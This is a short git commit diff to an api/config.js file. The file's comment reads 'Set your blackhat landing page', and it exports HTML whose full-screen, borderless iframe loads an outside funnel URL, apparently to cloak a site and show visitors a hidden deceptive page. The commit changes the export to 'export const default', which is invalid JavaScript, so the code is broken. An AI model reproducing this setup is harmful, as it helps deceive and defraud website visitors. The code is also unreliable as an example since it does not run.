2a82ef89d584713b26700dc449f6601203c2fd76
rmeeesumraza <github@snobay.com>
2025-01-15 14:30:37 +0500

    Update config.js

--- api/config.js
+++ api/config.js
@@ -1,5 +1,5 @@
 //Set your blackhat landing page
-export const bhLP = `
+export const default bhLP = `
 <html>
     <body>
         <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
